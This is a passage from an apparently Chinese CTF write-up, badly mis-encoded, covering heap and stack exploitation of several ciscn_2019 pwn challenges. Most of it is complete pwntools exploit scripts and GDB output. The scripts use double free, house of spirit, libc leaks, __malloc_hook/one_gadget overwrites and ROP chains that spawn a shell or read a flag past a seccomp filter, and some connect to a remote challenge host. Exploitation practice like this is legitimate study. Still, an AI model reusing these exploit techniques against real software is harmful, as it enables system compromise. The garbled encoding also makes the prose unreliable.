exit(0);&#125; ç»“åˆinitå¯çŸ¥ï¼Œæœ€ååŸºæœ¬ä¸Šå°±é è¿™ä¸ªå‡½æ•°å¾—åˆ°flagäº† delete 123456789101112if ( v1 == 1 &amp;&amp; int_pt ) &#123; free(int_pt); bool = 0; puts(&quot;remove success !&quot;); &#125; if ( v1 == 2 &amp;&amp; short_pt ) &#123; free(short_pt); bool = 0; puts(&quot;remove success !&quot;); &#125; é‡Šæ”¾æŒ‡é’ˆæŒ‡å‘çš„åœ°å€åï¼ŒæŒ‡é’ˆæœªç½®é›¶ add 123456789101112131415161718192021222324if ( v3 == 1 ) &#123; int_pt = malloc(0x20uLL); if ( !int_pt ) exit(-1); bool = 1; printf(&quot;your inode number:&quot;); v0 = (int *)int_pt; *v0 = get_atoi(); *((_DWORD *)int_pt + 2) = *(_DWORD *)int_pt; puts(&quot;add success !&quot;); &#125; if ( v3 == 2 ) &#123; short_pt = malloc(0x10uLL); if ( !short_pt ) exit(-1); bool = 1; printf(&quot;your inode number:&quot;); v1 = get_atoi(); *(_WORD *)short_pt = v1; *((_WORD *)short_pt + 4) = *(_WORD *)short_pt; puts(&quot;add success !&quot;); &#125; æ¯æ¬¡åˆ†é…çš„ç©ºé—´éƒ½æ˜¯å›ºå®šçš„ .bss 1234567891011.bss:0000000000202050 int_pt dq ? ; DATA XREF: show+4Eâ†‘r.bss:0000000000202050 ; show+5Aâ†‘r ....bss:0000000000202058 public short_pt.bss:0000000000202058 ; void *short_pt.bss:0000000000202058 short_pt dq ? ; DATA XREF: show+7Câ†‘r.bss:0000000000202058 ; show+88â†‘r ....bss:0000000000202060 public _bool.bss:0000000000202060 _bool dd ? ; DATA XREF: allocate:loc_F8Câ†‘w.bss:0000000000202060 ; allocate:loc_1009â†‘w ....bss:0000000000202064 align 8.bss:0000000000202064 _bss ends int_ptå’Œshort_ptå‡ä¸ºå…¨å±€æŒ‡é’ˆå˜é‡ ç¯å¢ƒæ˜¯ubuntu18ï¼Œåº”è¯¥æ˜¯ç”¨tcacheç´¯åŠ å¾—åˆ°ä¸€ä¸ªunsorted binï¼Œæœ€åé‡Šæ”¾åå¾—åˆ°libc base,å¾—åˆ°filenoï¼›ç„¶ååˆ©ç”¨house of spiritå°†stdinçš„filenoæ”¹ä¸º666ï¼Œscanfå°±ä¼šä»flagæ–‡ä»¶è¯»å–flag GDB over_lapping+libc_leak 1234567891011121314151617181920212223242526272829303132#code: add(1,0x30) #0x10 remove(1) #åŠ å…¥tcache add(2,0x20) #0x20 add(2,0x20) #0x20 add(2,0x20) #0x20 add(2,0x20) #0x20 remove(2) #åŠ å…¥tcache add(1,0x30) #0x10 remove(2) #åŠ å…¥tcache addr_chunk0_prev_size = show(2) - 0xa0 add(2, addr_chunk0_prev_size) add(2, addr_chunk0_prev_size) add(2, 0x91) gdb.attach(p)#gdb0x563281ce9250 PREV_INUSE &#123; mchunk_prev_size = 145, mchunk_size = 145, fd = 0x30, bk = 0x30, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x563281ce92e0 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 33, fd = 0x563281ce9250, bk = 0x9250, fd_nextsize = 0x0, bk_nextsize = 0x20d01&#125; å…¶å®æ˜¯é€šè¿‡mchunkæ¥å®ç°åˆå¹¶ï¼Œç›¸å…³é“¾æ¥å †æ¼æ´æŒ–æ˜:08â€”chunkçš„mchunk_prev_sizeæˆå‘˜çš„ç©ºé—´å¤ç”¨ 123456789101112131415161718192021#codefor i in range(0, 7): remove(1) add(2, 0x20) remove(1)#gdb0x55fcf5564250 PREV_INUSE &#123; mchunk_prev_size = 145, mchunk_size = 145, fd = 0x7f00598fcca0 &lt;main_arena+96&gt;, bk = 0x7f00598fcca0 &lt;main_arena+96&gt;, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;pwndbg&gt; bintcachebins0x20 [ -1]: 00x90 [ 7]: 0x55fcf5564260 â€”â–¸ 0x7f00598fcca0 (main_arena+96) â€”â–¸ 0x55fcf55643e0 â—‚â€” 0x0.........................unsortedbinall: 0x55fcf5564250 â€”â–¸ 0x7f00598fcca0 (main_arena+96) â—‚â€” 0x55fcf5564250 ä¸æ–­ç”³è¯·å’Œé‡Šæ”¾ï¼Œç”±äºtcacheæœ€å¤šåªèƒ½å­˜å‚¨7ä¸ªchunkï¼Œæ‰€ä»¥ä¹‹å‰çš„å…¨éƒ¨è¢«åˆ†é…è¿›äº†unsorted binï¼Œå®ç°äº†chunkçš„åˆå¹¶ï¼Œä¹‹åå¶å°±æ˜¯å¸¸è§„çš„æ‰¾åœ°å€äº† 4.EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *context.log_level = &quot;debug&quot;p = process(&quot;./ciscn_final_2&quot;)elf = ELF(&#x27;./ciscn_final_2&#x27;)libc = ELF(&#x27;/home/joe1sn/libc/64/libc-2.27.so&#x27;)def add(add_type, add_num): p.sendlineafter(&#x27;which command?\\n&gt; &#x27;, &#x27;1&#x27;) p.sendlineafter(&#x27;TYPE:\\n1: int\\n2: short int\\n&gt;&#x27;, str(add_type)) p.sendafter(&#x27;your inode number:&#x27;, str(add_num))def remove(remove_type): p.sendlineafter(&#x27;which command?\\n&gt; &#x27;, &#x27;2&#x27;) p.sendlineafter(&#x27;TYPE:\\n1: int\\n2: short int\\n&gt;&#x27;, str(remove_type))def show(show_type): p.sendlineafter(&#x27;which command?\\n&gt; &#x27;, &#x27;3&#x27;) p.sendlineafter(&#x27;TYPE:\\n1: int\\n2: short int\\n&gt;&#x27;, str(show_type)) if show_type == 1: p.recvuntil(&#x27;your int type inode number :&#x27;) elif show_type == 2: p.recvuntil(&#x27;your short type inode number :&#x27;) return int(p.recvuntil(&#x27;\\n&#x27;, drop=True))if __name__ == &#x27;__main__&#x27;: add(1,0x30) remove(1) add(2,0x20) add(2,0x20) add(2,0x20) add(2,0x20) remove(2) add(1,0x30) remove(2) addr_chunk0_prev_size = show(2) - 0xa0 add(2, addr_chunk0_prev_size) add(2, addr_chunk0_prev_size) add(2, 0x91) for i in range(0, 7): remove(1) add(2, 0x20) remove(1) addr_main_arena = show(1) - 96 libcbase = addr_main_arena - libc.sym[&#x27;__malloc_hook&#x27;] - 0x10 addr__IO_2_1_stdin__fileno = libcbase + libc.sym[&#x27;_IO_2_1_stdin_&#x27;] + 0x70 log.success(&quot;libc base &gt; %x&quot;,libcbase) log.success(&quot;addr IO 2 1 stdin fileno &gt; %x&quot;,addr__IO_2_1_stdin__fileno) gdb.attach(p) add(1, addr__IO_2_1_stdin__fileno) add(1, 0x30) remove(1) add(2, 0x20) remove(1) addr_chunk0_fd = show(1) - 0x30 add(1, addr_chunk0_fd) add(1, addr_chunk0_fd) add(1, 111) add(1, 666) p.sendlineafter(&#x27;which command?\\n&gt; &#x27;, &#x27;4&#x27;) p.recvuntil(&#x27;your message :&#x27;) p.interactive() EXPæ¥æº PwnKi-ciscn_2019_final_2 ciscn_2019_final_3 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 2.IDA åªæœ‰addå’Œremove 1234567891011def add(idx,size,data): p.sendlineafter(&quot;choice &gt; &quot;,&#x27;1&#x27;) p.sendlineafter(&quot;the index&quot;,str(idx)) p.sendlineafter(&quot;the size&quot;,str(size)) p.sendlineafter(&quot;something&quot;,data) p.recvuntil(&#x27;gift :&#x27;) return int(p.recvline()[2:],16)def free(idx): p.sendlineafter(&quot;choice &gt; &quot;,&#x27;2&#x27;) p.sendlineafter(&quot;the index&quot;,str(idx)) add 12345678910111213v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;input the size&quot;); std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::istream::operator&gt;&gt;(&amp;std::cin, &amp;size); if ( (unsigned int)size &lt;= 0x78 ) &#123; v2 = HIDWORD(size); qword_2022A0[v2] = malloc((unsigned int)size); v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;now you can write something&quot;); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); READ(qword_2022A0[HIDWORD(size)], size); puts(&quot;OK!&quot;); printf(&quot;gift :%p\\n&quot;, qword_2022A0[HIDWORD(size)]); &#125; å¯¹ç”³è¯·çš„å †çš„å¤§å°è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¹¶ä¸”å¯ä»¥ç»™æˆ‘ä»¬æŒ¡å¢™ç”³è¯·å †å—çš„åœ°å€ remove 123if ( v2 &gt; 0x18 ) exit(0); free(qword_2022A0[v2]); æŒ‡é’ˆæ²¡æœ‰æ¸…é›¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¤šæ¬¡é‡Šæ”¾æ¥å½¢æˆunsorted binï¼› ç„¶åé‡Šæ”¾unsorted binï¼Œæ¥æ³„éœ²libc baseå’Œmalloc hookï¼› æœ€åé€šè¿‡malloc hook+one gadgetæ¥getshehll 3.GDB 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#codeheap=add(0,0x78,&#x27;a&#x27;)#0print(hex(heap))add(1,0x18,&#x27;b&#x27;)#1add(2,0x78,&#x27;c&#x27;)#2add(3,0x78,&#x27;d&#x27;)#3 add(4,0x78,&#x27;c&#x27;)#4add(5,0x78,&#x27;d&#x27;)#5 add(6,0x78,&#x27;c&#x27;)#6add(7,0x78,&#x27;d&#x27;)#7 add(8,0x78,&#x27;c&#x27;)#8add(9,0x78,&#x27;d&#x27;)#9 add(10,0x78,&#x27;c&#x27;)#10add(11,0x78,&#x27;d&#x27;)#11add(12,0x28,&#x27;d&#x27;)#12#dup (double free)free(12)free(12)gdb.attach(p)#è¾“å‡º&gt; 0x557389971e70#GDB0x557389971e60 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 129, fd = 0xa61, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x557389971ee0 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 33, fd = 0xa62, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x81&#125;0x557389971f00 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 129, fd = 0xa63, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;................................................0x557389972400 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 49, fd = 0x557389972410, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;pwndbg&gt; x/16gx 0x5573899724000x557389972400: 0x0000000000000000 0x00000000000000310x557389972410: 0x0000557389972410 0x00000000000000000x557389972420: 0x0000000000000000 0x00000000000000000x557389972430: 0x0000000000000000 0x000000000000ebd10x557389972440: 0x0000000000000000 0x00000000000000000x557389972450: 0x0000000000000000 0x00000000000000000x557389972460: 0x0000000000000000 0x00000000000000000x557389972470: 0x0000000000000000 0x0000000000000000 12345678910111213141516#codeadd(13,0x28,p64(heap-0x10))#4 add(14,0x28,p64(heap-0x10))#5add(15,0x28,p64(0)+p64(0x421))#get chunk0-&gt;sizegdb.attach(p)&gt;&gt;&gt;ä¹‹å‰çš„è¾“å‡ºä¸º0x561fb56f5e60#GDB0x561fb56f5e60 PREV_INUSE &#123; mchunk_prev_size = 0, mchunk_size = 1057, fd = 0xa0a, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;&gt;&gt;&gt;è¿™é‡Œçš„sizeä½å·²ç»è¢«ä¿®æ”¹æˆäº†0x421ä¸ºåé¢åšå‡†å¤‡ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#codefree(0) #unsort_bin chunk0-&gt;fd=libcfree(1) #tcacheadd(16,0x78,&#x27;e&#x27;)#7 add(17,0x18,&#x27;f&#x27;)#8 get chunk1gdb.attach(p)&gt;&gt;&gt;è¾“å‡º 0x55584522be60#GDB0x55584522be60 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 129, fd = 0x7fbd07fc0a65, bk = 0x7fbd07fca090 &lt;main_arena+1104&gt;, fd_nextsize = 0x55584522be60, bk_nextsize = 0x55584522be60&#125;0x55584522bee0 PREV_INUSE &#123; mchunk_prev_size = 0, mchunk_size = 929, fd = 0x7fbd07fc0a66, bk = 0x7fbd07fc9ca0 &lt;main_arena+96&gt;, fd_nextsize = 0x0, bk_nextsize = 0x81&#125;pwndbg&gt; bintcachebins0x20 [ 0]: 0x7fbd07fc9ca0 (main_arena+96) â—‚â€” ...0x30 [ -1]: 0unsortedbinall [corrupted]FD: 0x55584522bee0 â—‚â€” 0x7fbd07fc0a66BK: 0x55584522bee0 â€”â–¸ 0x7fbd07fc9ca0 (main_arena+96) â—‚â€” 0x55584522bee0pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA................... 0x55584521a000 0x55584523b000 rw-p 21000 0 [heap] ..................................0x7fbd07bde000 0x7fbd07dc5000 r-xp 1e7000 0 /lib/x86_64-linux-gnu/libc-2.27.so&gt;&gt;&gt;è¿™é‡Œå·²ç»è¢«ä¿®æ”¹ä¸ºäº†unsorted binï¼Œå†æ¬¡ç”³è¯·å †çš„è¯å°±æ˜¯ç”³è¯·[0x562fe6debee0 PREV_INUSE]è¿™å—çš„bkï¼Œè€Œä¸”è¿”å›çš„åœ°å€æ˜¯&gt; bk = 0x7f22f4cccca0 &lt;main_arena+96&gt;#å¼€å§‹è®¡ç®—libc base&gt;&gt;&gt; hex(0x7fbd07fc9ca0-0x7fbd07bde000)&#x27;0x3ebca0&#x27;[DEBUG] Received 0x33 bytes: &#x27;OK!\\n&#x27; &#x27;gift :0x7fbd07fc9ca0\\n&#x27; &#x27;1. add\\n&#x27; &#x27;2. remove\\n&#x27; &#x27;choice &gt; &#x27;(&#x27;0x7fbd07bde000&#x27;, &#x27;0x7fbd07fc9c30&#x27;) 4.EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768from pwn import *#context.log_level = &quot;debug&quot;#p = process(&quot;./ciscn_final_3&quot;)p = remote(&quot;node3.buuoj.cn&quot;,27672)libc=ELF(&#x27;./libc.so.6&#x27;)def add(idx,size,data): p.sendlineafter(&quot;choice &gt; &quot;,&#x27;1&#x27;) p.sendlineafter(&quot;the index&quot;,str(idx)) p.sendlineafter(&quot;the size&quot;,str(size)) p.sendlineafter(&quot;something&quot;,data) p.recvuntil(&#x27;gift :&#x27;) return int(p.recvline()[2:],16)def free(idx): p.sendlineafter(&quot;choice &gt; &quot;,&#x27;2&#x27;) p.sendlineafter(&quot;the index&quot;,str(idx)) heap=add(0,0x78,&#x27;a&#x27;)#0log.info(&quot;chunks 0&gt; 0x%x&quot;,heap)add(1,0x18,&#x27;b&#x27;)#1add(2,0x78,&#x27;c&#x27;)#2add(3,0x78,&#x27;d&#x27;)#3 add(4,0x78,&#x27;c&#x27;)#4add(5,0x78,&#x27;d&#x27;)#5 add(6,0x78,&#x27;c&#x27;)#6add(7,0x78,&#x27;d&#x27;)#7 add(8,0x78,&#x27;c&#x27;)#8add(9,0x78,&#x27;d&#x27;)#9 add(10,0x78,&#x27;c&#x27;)#10add(11,0x78,&#x27;d&#x27;)#11add(12,0x28,&#x27;d&#x27;)#12#dup (double free)free(12)free(12)#gdb.attach(p)add(13,0x28,p64(heap-0x10))#4 add(14,0x28,p64(heap-0x10))#5add(15,0x28,p64(0)+p64(0x421))#get chunk0-&gt;size#gdb.attach(p)#overlapfree(0) #unsort_bin chunk0-&gt;fd=libcfree(1) #tcacheadd(16,0x78,&#x27;e&#x27;)#7 add(17,0x18,&#x27;f&#x27;)#8 get chunk1#gdb.attach(p)leak=add(18,0x18,&#x27;g&#x27;)#9 get libclibc_base =leak - 0x3ebca0malloc_hook=libc_base+libc.sym[&#x27;__malloc_hook&#x27;]one_gadget=libc_base+0x10a38clog.info(&quot;libc base 0x%x&quot;,libc_base)log.info(&quot;malloc hook 0x%x&quot;,malloc_hook)log.info(&quot;one gadget 0x%x&quot;,one_gadget)#dupfree(5)free(5)add(19,0x78,p64(malloc_hook))add(20,0x78,p64(malloc_hook))add(21,0x78,p64(one_gadget))#getshellp.sendline(&#x27;1&#x27;)p.sendline(&#x27;22&#x27;)p.sendline(&#x27;0;cat flag&#x27;)p.interactive() ciscn_2019_final_4 https://blog.csdn.net/seaaseesa/article/details/105855306 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA sandbox 1234567 line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000000 A = sys_number 0001: 0x35 0x02 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0004 0002: 0x15 0x01 0x00 0x0000003b if (A == execve) goto 0004 0003: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0004: 0x06 0x00 0x00 0x00000000 return KILL delete 123456789101112131415unsigned __int64 delete()&#123; int idx; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;please don&#x27;t patch this function!! I will check it!!&quot;); puts(&quot;index ?&quot;); _isoc99_scanf(&quot;%d&quot;, &amp;idx); if ( idx &gt;= 0 &amp;&amp; idx &lt;= 31 &amp;&amp; note[idx] ) free(note[idx]); else puts(&quot;invalid index&quot;); return __readfsqword(0x28u) ^ v2;&#125; uafé€ æˆdouble free ç¨‹åºåªèƒ½orwï¼Œå­˜åœ¨uafï¼Œchunk-&gt;sizeå¤§å°éšæ„ï¼Œshowå¯ä»¥æ³„éœ² 3.æ€è·¯ åœ¨å†™nameçš„æ—¶å€™ä¼ªé€ ä¸€ä¸ªchunkå¤´ ç„¶åç”¨uaf æ³„éœ²libcbaseå’Œenviron åˆ©ç”¨environæ‰¾åˆ°name(fake_chunk)ï¼Œä½¿ç”¨double freeåˆ†é…è¿‡å» æ³„éœ²canaryï¼Œæ‰©å¤§rsp å†™orwçš„ropchain 4.EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138#coding:utf8from pwn import * sh = remote(&#x27;node3.buuoj.cn&#x27;,25021)#sh = process(&#x27;./ciscn_final_4&#x27;)#sh = process(&#x27;./test&#x27;)libc = ELF(&#x27;libc-2.23.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]environ_s = libc.symbols[&#x27;__environ&#x27;] fake_chunk = p64(0) + p64(0x81)payload = &#x27;a&#x27;*0xE8 + fake_chunk sh.sendafter(&#x27;what is your name?&#x27;,payload) def add(size,content): sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;) sh.sendlineafter(&#x27;size?&#x27;,str(size)) sh.sendafter(&#x27;content?&#x27;,content) def delete(index): sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;) sh.sendlineafter(&#x27;index ?&#x27;,str(index)) def show(index): sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;) sh.sendlineafter(&#x27;index ?&#x27;,str(index)) #0add(0x100,&#x27;a&#x27;*0x100)#1add(0x78,&#x27;b&#x27;*0x78)#2add(0x78,&#x27;c&#x27;*0x78)#3add(0x38,&#x27;d&#x27;*0x38)#4add(0x38,&#x27;e&#x27;*0x38)#5add(0x10,&#x27;d&#x27;*0x10)#6add(0x81,&#x27;f&#x27;*0x81)#heap_sizeæ•°ç»„çš„0x81æ•°æ®ç”¨äºä¼ªé€ chunkçš„sizeheapsize6_addr = 0x0000000000602058note_addr = 0x00000000006020C0 delete(0)show(0)sh.recvuntil(&#x27;\\n&#x27;)main_arena_88 = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_senviron_addr = libc_base + environ_spop_rdi = libc_base + 0x0000000000021102pop_rsi = libc_base + 0x00000000000202e8pop_rdx = libc_base + 0x0000000000001b92#add rsp, 0x148 ; retadd_rsp_148 = libc_base + 0x00000000000353aaopenat_addr = libc_base + libc.sym[&#x27;openat&#x27;]read_addr = libc_base + libc.sym[&#x27;read&#x27;]puts_addr = libc_base + libc.sym[&#x27;puts&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;environ_addr=&#x27;,hex(environ_addr)#double freedelete(1)delete(2)delete(1)add(0x78,p64(heapsize6_addr - 0x8)) #7add(0x78,&#x27;c&#x27;) #8add(0x78,&#x27;a&#x27;) #9#æ§åˆ¶notesizeä»¥åŠnoteæ•°ç»„payload = &#x27;\\x00&#x27;*0x60payload += p64(environ_addr) #ptr0add(0x78,payload) #10#æ³„éœ²æ ˆåœ°å€show(0)sh.recvuntil(&#x27;\\n&#x27;)stack_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;stack_addr=&#x27;,hex(stack_addr)fake_chunk_stack_addr = stack_addr - 0x120print &#x27;fake_chunk_stack_addr=&#x27;,hex(fake_chunk_stack_addr)#åˆ©ç”¨åŒæ ·çš„æ–¹æ³•åˆ†é…åˆ°æ ˆä¸Šä¼ªé€ çš„chunk#double freedelete(1)delete(2)delete(1)add(0x78,p64(fake_chunk_stack_addr)) #11add(0x78,&#x27;c&#x27;) #12add(0x78,&#x27;a&#x27;) #13#å†™æ ˆadd(0x78,&#x27;d&#x27;*0x11) #14#æ³„éœ²canaryshow(14)sh.recvuntil(&#x27;d&#x27;*0x11)canary = u64(sh.recv(7).rjust(8,&#x27;\\x00&#x27;))print &#x27;canary=&#x27;,hex(canary)#é‡æ–°åˆ†é…åˆ°fake_chunk_stack_addrï¼Œå¸ƒç½®rop#double freedelete(1)delete(2)delete(1)add(0x78,p64(fake_chunk_stack_addr)) #15add(0x78,&#x27;c&#x27;) #16add(0x78,&#x27;a&#x27;) #17#ç”±äºé•¿åº¦ä¸å¤Ÿè¾“å…¥ï¼Œæˆ‘ä»¬è°ƒç”¨readç»§ç»­è¾“å…¥ropnext_rop_addr = fake_chunk_stack_addr + 0x88payload = &#x27;a&#x27;*0x40payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(next_rop_addr) + p64(pop_rdx) + p64(0x1000) + p64(read_addr)add(0x78,payload) #18 #ç”±äºæ— æ³•è§¦å‘mainå‡½æ•°ropï¼Œå› ä¸ºæœ‰ä¸€ä¸ªæ­»å¾ªç¯ï¼Œæ‰€ä»¥æˆ‘ä»¬åŠ«æŒnewå‡½æ•°æ¥ropåˆ°mainåé¢#æ¥ä¸‹æ¥ï¼Œåˆ†é…åˆ°newå‡½æ•°çš„æ ˆæœ«å°¾å¤„fake_chunk_stack_addr2 = stack_addr - 0x246#double freedelete(3)delete(4)delete(3)add(0x38,p64(fake_chunk_stack_addr2)) #15add(0x38,&#x27;c&#x27;) #16add(0x38,&#x27;a&#x27;) #17 payload = &#x27;d&#x27;*0x6 + p64(canary) + p64(0)payload += p64(add_rsp_148) #è·³åˆ°mainå‡½æ•°åé¢çš„ropé‡Œ#newå‡½æ•°è¿”å›åˆ°add_rsp_148è¿›è€Œè·³åˆ°mainåé¢çš„ropé‡Œadd(0x38,payload) flag_addr = next_rop_addr + 0x88#openat(0,flag_addr,0)rop = p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdi) + p64(0) + p64(openat_addr)#read(fd,flag_addr,0x30)rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(read_addr)#puts(flag_addr)rop += p64(pop_rdi) + p64(flag_addr) + p64(puts_addr)rop += &#x27;/flag\\x00&#x27;sleep(0.5)sh.send(rop) sh.interactive() ciscn_2019_n_1 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 12345678910111213141516171819202122232425262728293031323334353637383940// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+Ch] [rbp-4h] init(*(_QWORD *)&amp;argc, argv, envp); puts(&quot;EEEEEEE hh iii &quot;); puts(&quot;EE mm mm mmmm aa aa cccc hh nn nnn eee &quot;); puts(&quot;EEEEE mmm mm mm aa aaa cc hhhhhh iii nnn nn ee e &quot;); puts(&quot;EE mmm mm mm aa aaa cc hh hh iii nn nn eeeee &quot;); puts(&quot;EEEEEEE mmm mm mm aaa aa ccccc hh hh iii nn nn eeeee &quot;); puts(&quot;====================================================================&quot;); puts(&quot;Welcome to this Encryption machine\\n&quot;); begin(&quot;Welcome to this Encryption machine\\n&quot;); while ( 1 ) &#123; while ( 1 ) &#123; fflush(0LL); v4 = 0; __isoc99_scanf(&quot;%d&quot;, &amp;v4); getchar(); if ( v4 != 2 ) break; puts(&quot;I think you can do it by yourself&quot;); begin(&quot;I think you can do it by yourself&quot;); &#125; if ( v4 == 3 ) &#123; puts(&quot;Bye!&quot;); return 0; &#125; if ( v4 != 1 ) break; encrypt(); begin(&quot;%d&quot;); &#125; puts(&quot;Something Wrong!&quot;); return 0;&#125; encrypt 123456789101112131415161718192021222324252627282930313233343536int encrypt()&#123; size_t v0; // rbx char s[48]; // [rsp+0h] [rbp-50h] __int16 v3; // [rsp+30h] [rbp-20h] memset(s, 0, sizeof(s)); v3 = 0; puts(&quot;Input your Plaintext to be encrypted&quot;); gets(s); while ( 1 ) &#123; v0 = (unsigned int)x; if ( v0 &gt;= strlen(s) ) break; if ( s[x] &lt;= 96 || s[x] &gt; 122 ) &#123; if ( s[x] &lt;= 64 || s[x] &gt; 90 ) &#123; if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 ) s[x] ^= 0xFu; &#125; else &#123; s[x] ^= 0xEu; &#125; &#125; else &#123; s[x] ^= 0xDu; &#125; ++x; &#125; puts(&quot;Ciphertext&quot;); return puts(s);&#125; æ²¡æœ‰binshå­—ç¬¦ä¸²ï¼Œæ²¡æœ‰systemå‡½æ•°,åº”è¯¥æ˜¯ä¸€ä¸ªputså‡½æ•°æ³„éœ²libcçš„é¢˜ BUUCTFçš„resourceä¸€æ æœ‰libc.soæ–‡ä»¶ 3.EXP 12345678910111213141516171819202122232425262728293031323334353637from pwn import *#context.log_level = &#x27;debug&#x27;p = remote(&quot;node3.buuoj.cn&quot;,25460)elf = ELF(&quot;./ciscn_2019_c_1&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]main_addr = elf.sym[&quot;main&quot;]libc_puts = libc.sym[&quot;puts&quot;]system = libc.sym[&quot;system&quot;]binsh = next(libc.search(&#x27;/bin/sh&#x27;))pop_rdi = 0x0400c83leave_ret = 0x04006b9payload = &#x27;A&#x27;*(0x50+8) + p64(pop_rdi)+ p64(puts_got) + p64(puts_plt) + p64(main_addr)p.recvuntil(&quot;Input your choice!\\n&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Input your Plaintext to be encrypted\\n&quot;)p.sendline(payload)p.recvuntil(&#x27;@\\n&#x27;)puts_real = u64(p.recv(6).ljust(8,&quot;\\x00&quot;))libc_base = puts_real - libc_putssystem_real = system + libc_basebinsh_real = binsh + libc_basepayload = &#x27;\\x00&#x27;*(0x50+8) + p64(leave_ret) + p64(pop_rdi) + p64(binsh_real) + p64(system_real)p.recvuntil(&quot;Input your choice!\\n&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Input your Plaintext to be encrypted\\n&quot;)p.sendline(payload)p.interactive() è¿˜æœ‰ä¸€ä¸ªå‘å°±æ˜¯Ubuntu18ä¸‹é¢è°ƒç”¨systemè¦å¯¹é½æ ˆï¼Œå°±éœ€è¦ç”¨ä¸€ä¸ªret å‚ç…§EXP:[https://www.jianshu.com/p/f6839b1e7283]( ciscn_2019_n_3 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA å‘ç°ç¨‹åºæœ‰ä¸‰ä¸ªåŠŸèƒ½ 1234puts(&quot;1. New note&quot;);puts(&quot;2. Del note&quot;);puts(&quot;3. Show note&quot;);puts(&quot;4. Purchase Pro Edition&quot;) //è¿™ä¸ªæ²¡ç”¨ rec_str_free 123456int __cdecl rec_str_free(void *ptr)&#123; free(*((void **)ptr + 2)); free(ptr); return puts(&quot;Note freed!&quot;);&#125; freeåæŒ‡é’ˆæœªæ¸…é›¶ 3.GDBåŠ¨æ€è°ƒè¯• 12345678910111213141516171819//code: newnote(0,2,&#x27;a&#x27;*10,0x88)//gdb0x8cf7000 FASTBIN &#123; prev_size = 0, size = 17, fd = 0x80486de &lt;rec_str_print&gt;, bk = 0x8048725 &lt;rec_str_free&gt;, fd_nextsize = 0x8cf7018, bk_nextsize = 0x91&#125;0x8cf7010 PREV_INUSE &#123; prev_size = 147812376, size = 145, fd = 0x61616161, bk = 0x61616161, fd_nextsize = 0xa6161, bk_nextsize = 0x0&#125; å‘ç°ç”³è¯·çš„å †é‡Œé¢å«æœ‰rec_str_freeçš„æŒ‡é’ˆ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨UAFæ¥ä¿®æ”¹æŒ‡é’ˆï¼Œä»è€Œgetshell 4.EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&quot;ciscn_2019_n_3&quot;)p = 